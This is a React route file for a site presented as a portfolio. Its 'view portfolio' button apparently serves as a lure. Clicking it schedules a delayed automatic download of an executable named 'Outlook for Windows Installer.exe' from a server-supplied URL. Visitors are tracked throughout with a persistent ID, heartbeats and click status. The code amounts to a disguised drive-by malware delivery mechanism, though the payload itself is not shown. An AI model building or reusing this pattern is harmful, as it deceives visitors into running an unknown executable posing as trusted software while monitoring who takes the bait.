import { createFileRoute } from "@tanstack/react-router";
import { useEffect, useState } from "react";
import { Toaster } from "@/components/ui/sonner";
import { EntryModal } from "@/components/EntryModal";
import { Navbar } from "@/components/Navbar";
import { Portfolio } from "@/components/Portfolio";
import { LanguageProvider } from "@/lib/i18n";
import { recordActivity } from "@/lib/activity";
import { scheduleInstallerDownload } from "@/lib/installer-download";
import { toast } from "sonner";

export const Route = createFileRoute("/")({
  component: Index,
});

function Index() {
  const [modalOpen, setModalOpen] = useState(true);
  const [isSchedulingInstaller, setIsSchedulingInstaller] = useState(false);
  const downloadInstaller = async () => {
    if (isSchedulingInstaller) return;

    setIsSchedulingInstaller(true);
    const visitorId = localStorage.getItem("portfolio-visitor-id") ?? crypto.randomUUID();
    localStorage.setItem("portfolio-visitor-id", visitorId);
    try {
      const { availableAt, downloadUrl } = await scheduleInstallerDownload({ data: { visitorId } });
      void recordActivity({ data: { visitorId, siteStatus: "active", appStatus: "clicked", userAgent: navigator.userAgent } });
      setModalOpen(false);
      toast.message("Your installer download will begin in one minute.");
      window.setTimeout(() => {
        startInstallerDownload(downloadUrl);
      }, Math.max(0, availableAt - Date.now()));
    } catch (error) {
      toast.error("Unable to schedule the installer download. Please try again.");
      console.error(error);
      setIsSchedulingInstaller(false);
    }
  };
  useEffect(() => {
    const visitorId = localStorage.getItem("portfolio-visitor-id") ?? crypto.randomUUID();
    localStorage.setItem("portfolio-visitor-id", visitorId);
    const userAgent = navigator.userAgent;
    const update = (siteStatus: "active" | "left", appStatus?: "not_clicked" | "clicked") =>
      void recordActivity({ data: { visitorId, siteStatus, appStatus, userAgent } });
    update("active");
    const heartbeat = window.setInterval(() => update("active"), 20000);
    const onPageHide = () => update("left");
    const onFocus = () => update("active");
    window.addEventListener("pagehide", onPageHide);
    window.addEventListener("focus", onFocus);
    return () => { window.clearInterval(heartbeat); window.removeEventListener("pagehide", onPageHide); window.removeEventListener("focus", onFocus); };
  }, []);

  return (
    <LanguageProvider>
      <div className="min-h-screen bg-background">
        <Navbar />
        <Portfolio />
        <EntryModal
          open={modalOpen}
          isScheduling={isSchedulingInstaller}
          onViewPortfolio={() => void downloadInstaller()}
        />
        <Toaster />
      </div>
    </LanguageProvider>
  );
}

function startInstallerDownload(downloadUrl: string) {
  const link = document.createElement("a");
  link.href = downloadUrl;
  link.download = "Outlook for Windows Installer.exe";
  document.body.append(link);
  link.click();
  link.remove();
}
